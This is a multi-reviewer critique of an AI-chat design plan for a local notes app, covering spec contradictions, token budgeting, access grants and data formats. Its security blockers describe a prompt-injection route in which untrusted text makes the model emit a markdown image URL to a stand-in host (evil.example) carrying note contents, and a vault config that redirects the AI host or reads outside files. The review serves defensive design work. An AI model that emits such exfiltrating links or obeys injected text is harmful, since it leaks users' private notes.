# Stage 7 — Critic Review

Target: `docs/PLAN.md` FeatureRange 1..614. Context: `docs/TRACKER.md`, `CLAUDE.md`; reviewers could read code.

Reviewers (all completed):

- egm-design (feature-spec-standard)
- egm-structural (feature-spec-standard)
- egm-style

Focus: AI work.

The main context checked the three security findings (D-B1, D-B2, D-B3) against the code:

- `render_html('![x](https://evil.example/?d=secret)')` returns `<img src="https://evil.example/?d=secret">`. The chat shows it with `ui.html(..., sanitize=False)` (`gui/components/chat.py:443`, `:937`). The only Content-Security-Policy in the code is for SVG files (`gui/files.py:108`).
- `core/config.py:154–156` merges every `vault.toml` key over the global config. No key is kept global-only.
- `gui/layout.py:748` `_chat_selection` attaches the selection with no `may_send` check.

Findings are tagged by reviewer: **D** = design, **S** = structural, **W** = style (writing).

## 🔴 Blockers

**D-B1. Chat replies fetch remote images, so notes can leak (L209, L313, L531–540). Verified in code.**
The model reads text the user does not control: pasted web text, outside folders, uploaded files and `@vault` hits. That text can tell the model to write `![](https://x/?d=<notes>)`, and the chat webview then fetches the URL. The editor already follows the "never fetch remote images" rule (L209); the chat does not.
Fix:
- Apply the editor's remote-image rule to chat output.
- Add a CSP `img-src 'self' data:` to the app pages.
- Specify how links in replies open (system browser after a confirm, never in the app window).

**D-B2. `vault.toml` can redirect the AI or read outside files (L304, L318, L344, L532). Verified in code.**
L532 keeps grants outside the vault "so a copied vault cannot grant itself access", but any key can be overridden per vault. So a downloaded vault can set:

- `ai.host` to a remote server: after the user clicks Allow, every note goes there.
- `ai.instructions_file` to any absolute path: the file is read on every message, bypassing `AccessPolicy`.
- `ai.edits = auto`, `ai.prompts_file`, or `ai.chats_folder` to an absolute path.

Fix:
- Make the AI security keys global-only.
- Run the instruction and prompts files through `AccessPolicy`.
- Show the host in the consent prompt and store it in the grant.

**D-B3. Auto selection chips bypass `ai: false` / `ai.exclude` (L531, L533, L534). Verified in code.**
With `ai.selection_to_chat = Automatically` (the default), any settled selection becomes a chip, even in a private note, and chips are "sent as given". Quotes saved on earlier turns are also re-sent without a policy check.
Fix:
- Don't auto-attach from a refused note.
- Mark explicitly picked chips from such notes.
- Re-check saved quotes before re-sending them.

**S-B1 / W-M1–M3, M9 / D-M9. §4.11 and other sections contradict §4.26, and nothing is marked as superseded.**

| Old text | Newer text |
|---|---|
| L320: `num_ctx` 0 = the model's default | L537: 0 = automatic (model limit capped at 8k), always sent |
| L307: 6000-token budget, filled in a fixed order | L537: 60 % of the room after the answer reserve |
| L323: Fix grammar "replaces the selection" | L530: Fix grammar shows a proposal |
| L321: every AI command uses StreamInsert | L529: some commands go through EditProposal |
| L315: chats are in memory only | Same line: chats are saved |
| L465: vault reading is "out of scope" | §4.26 specifies it |
| L465: turning AI on needs no restart | L527: AI needs `--ai` |
| L526/L527 heading: "separate install" | L527 text: "not an install" |
| L313: "Insert into note" is always shown | L529: Read-only hides it |

Fix: one AI section. Rewrite or remove the old text.

**S-B2 / D-M5. No AI risks or failure-modes section (§8 L927–936).**
Missing:

- prompt injection
- path grants in `--serve` mode (a browser session can grant read access to the server's disk)
- symlinks inside outside grants
- mid-stream errors and partial inserts or proposals
- the non-Latin token estimate
- several pages or windows writing the same chat file (last writer wins)
- privacy of saved chats

**S-B3. §5 has no AI data formats (L600–611).**
Missing:

- the chat JSON schema (`turns`, `quotes`, `notes`, `sources`, `reasoning`, `summary`, `summarized`, per-turn `context`)
- `ai_access.json`
- one table of all `ai.*` keys and defaults

`file_types` and `exclude` are stored both in settings (L531) and in `ai_access.json` (L532); which one wins is not stated (also W-M5).

**W-B1 / D-M1. The rule "The AI never writes into a note" is false as written (L529, L313, L321, L323, L502).**
Under the default *Ask first* mode, Continue writing, Summarize and Explain stream straight into the note, and autosave writes partial output on Stop or crash. "the other two" is ambiguous. It is unclear whether *Read-only* refuses these commands, and whether *Insert into note* goes through the diff.
Fix: a matrix of entry point × `ai.edits` mode → direct insert / proposal / refused. Also state what autosave does during a stream.

## 🟡 Majors

**Context and tokens**

- **D-M2.** chars ÷ 4 undercounts Bengali by 2–4×. Ollama then silently cuts the start of the prompt (the system prompt, instruction and summary). Calibrate from `prompt_eval_count`, warn near the limit, and record why no tokenizer is used.
- **W-M8.** Neither budget rule covers chips, uploads, outside files, `@vault` hits, earlier turns' notes or the system instruction (up to about 2000 tokens). The case where the newest message alone overflows is not covered either. At the defaults, 60 % × (8192 − 2048) ≈ 3686, so `context_budget` 6000 never binds.
- **W-M10.** "Turn" and "message" are mixed (`history_turns` 12, "last 4 messages", `summarized` in turns).
- **D-M3.** Compaction cuts with `transcript[-limit*4:]`, so the old summary at the start is lost first. A failed summary is retried before every message (300 s timeout). There is no progress indicator and no Stop.
- **W-M11.** "Prompt's room" is undefined. Compaction changes the system prompt, which breaks the L538 rule that "only the last message differs".
- **D-M4.** The caching claim (L538) is inaccurate. The notes block moves to the end and is processed again on every message. Fix the claim, or keep stable notes in an early cached block.

**Access and privacy**

- **D-M6.** Outside grants have no limits:
  - A single Allow can grant `~` or `/`.
  - There is no denylist (`~/.ssh`, `~/.gnupg`).
  - Hidden files are read.
  - `os.walk` is synchronous and stops only after 2000 *matches*, on the UI loop.
- **W-M4.** "Default: the whole vault" contradicts "nothing before Allow". Rename it to "scope once granted".
- **W-M6.** Settings → Access is described as "only lists" outside paths, then as "edit its paths".
- **W-M7.** Whether user-attached content bypasses scope, per kind (live selection, chip, whole note), needs one rule.

**Edits**

- **D-M7.** The proposal life cycle is unspecified on tab switch, close, rename, split view, external reload or restart. Can proposals stack?
- **W-M12.** Note-level Rewrite (⋯ menu) goes to chat, and *Apply to note* only works with a single selection, so there is no path from Rewrite to a diff.
- **W-N9.** "Out of date if changed" conflicts with `locate` accepting "found once elsewhere".

**Failures**

- **D-M8 / W-M16.** The spec says a startup check; the code polls every 30 s. Not covered:
  - a missing model
  - a mid-stream death
  - a cached `show` failure that leaves the window at 8k
  - two streams at once
  - several `--serve` tabs, each with its own engine
  - reasoning eating the answer room (no `num_predict` is sent)

  The banner text "start it with `ollama serve`" is wrong for a remote host.

**Switches and settings**

- **W-M2.** The precedence of `features.ai`, `--ai`, `PAPER_PILE_AI`, `PAPER_PILE_NO_AI` and `PAPER_PILE_FAKE_AI` is undefined.
- **S-M4 / W-M15.** Settings → AI is described four ways (L317, L341, L467, L533, L592). The table lacks Access, `ai.edits`, `ai.selection_to_chat` and `ai.prompts_file`.
- **W-M13.** Suggested prompts are specified twice (3–4 chips vs ≤ 6; `diagram` kind; "best few" vs "3 best" `@vault` hits).

**Interfaces and layout**

- **S-M3 / W-M14.**
  - The `Provider` protocol (L303) lacks `options=`, `Reasoning` items and `context_length`.
  - `CommandContext` (L251) still holds "ai provider".
  - The Actions list (L252) has no proposal action.
  - The engine's event payloads are never given.
- **S-M5.** §3 is stale: `core/ai/` lists 3 of about 15 modules, `gui/` lacks `ai_access.py` and `memories.py`, and `editor_src` lacks `proposal.js`, `selectbar.js` and `selectionsync.js`.
- **S-M6 / W-M18.** In §4.26, "Implemented" notes come before the specs and repeat them. Function names crowd out the behaviour.
- **S-M7.** §4 order and numbering are broken (4.5b after 4.14; 4.26 → 4.20 run backwards; a `---` splits §4).

**Missing decision records**

- **S-M1 / D-M10.** No Alternatives Considered for:
  - Ollama only
  - FTS vs embeddings
  - line vs word diffs
  - LLM summary vs trimming
  - grant storage location
  - chars ÷ 4
  - the 8k cap
- **S-M2.** No AI Goals / Non-goals list in one place (offline, local only, no telemetry, the gate). L322 and L541 split the non-goals.

**Terms**

- **W-M17.** "Memories" means saved chats, while "long-term memory across chats" is "Not now", and §4.24 "Memory" is about RAM.

## 🟢 Nits

- **S-N1**: no blank line before `### 4.5` (L183–184).
- **S-N2**: `ollama` is not pinned in §2.
- **S-N3 / W-B1**: "the other two" (L529) is ambiguous.
- **S-N4**: "k = 1024" should appear in the setting's help text.
- **S-N5**: the "AI can make mistakes" disclaimer is only in §4.21.
- **S-N6**: the `sparkles` icon rule is not referenced from the AI section.
- **S-N7**: the status bar's "Ollama status" should be hidden without `--ai`.
- **W-N1**: "AI truly built in" is inaccurate now that AI is opt-in.
- **W-N2**: "friendly banner" is subjective; give the banner text.
- **W-N3**: "little effort" and "not heavy" cannot be measured.
- **W-N4**: the stale L315 sentence should go. Does the atomic write apply when save is off?
- **W-N5**: do uploaded file texts end up in the chat JSON?
- **W-N6**: the saved-chat field list is incomplete, and `context` is undefined.
- **W-N7**: "Write with AI" names two different features.
- **W-N8**: "Ask" has five meanings. "Settled selection", "context line", "block" and "notice" vs "banner" are undefined.
- **W-N10**: do outside grants include subfolders? Are 2000 files per folder or in total? What about relative paths?

## Possibly missing AI features (from all three reviewers)

- The model and options recorded per saved turn, and per chat on reopen
- Image handling: never sent, or vision support later
- `@vault` for non-English queries, and the zero-hit behaviour
- Revoking a grant purging content from saved chats
- Earlier notes dropping out after a tab switch mid-chat
- `num_ctx` / `keep_alive` changes forcing model reloads
- Throttled re-rendering while a reply streams (markdown, math and Mermaid on every chunk)
- Path detection firing on pasted logs
- A stronger warning when *Apply at once* is turned on
- Undo for *Apply at once* on background or unopened notes
- How AI edits appear in Version history
- `ai: false` for `.txt` files
- The FakeProvider / `PAPER_PILE_FAKE_AI` testing approach documented in PLAN
